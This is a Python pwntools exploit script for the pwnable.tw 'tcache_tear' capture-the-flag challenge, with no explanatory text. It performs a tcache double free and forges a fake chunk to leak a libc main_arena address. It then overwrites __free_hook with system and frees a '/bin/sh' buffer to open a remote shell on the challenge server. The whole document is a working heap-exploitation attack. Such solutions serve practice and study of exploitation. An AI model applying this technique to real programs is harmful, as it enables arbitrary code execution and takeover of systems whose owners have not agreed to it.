from pwn import *

#r = process("./tcache_tear")
r = remote("chall.pwnable.tw", 10207)

def name(name):
    r.recvuntil(':')
    r.sendline(name)

def malloc(size, data):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(size)
    r.recvuntil(':')
    r.sendline(data)

def free():
    r.recvuntil(':')
    r.sendline('2')

def info():
    r.recvuntil(':')
    r.sendline('3')
    info = r.recvuntil('Tcache')
    return info

def main():
    name('123')
    malloc('10', 'aaaa')
    free()
    free()
    malloc('10', p64(0x602050))
    malloc('10', 'aaaa')
    malloc('10', p64(0x0) + p64(0x421) + p64(0x0)*5 + p64(0x602060) + p64(0x0)*125 + p64(0x21) + p64(0x0)*3 + p64(0x21))
    free()
    leak = info()
    main_arena = u64(leak[6:14])
    system = main_arena - 0x39c860 
    free_hook = main_arena + 0x1c48
    print("main_arena: " + hex(main_arena))
    print("free_hook: " + hex(free_hook))
    print("system: " + hex(system))
    malloc('50', 'aaaaaaaa')
    free()
    free()
    malloc('50', p64(free_hook))
    malloc('50', 'aaaaaaaa')
    malloc('50', p64(system))
    malloc('50', '/bin/sh')
    free()
    r.interactive()

if __name__ == '__main__':
    main()
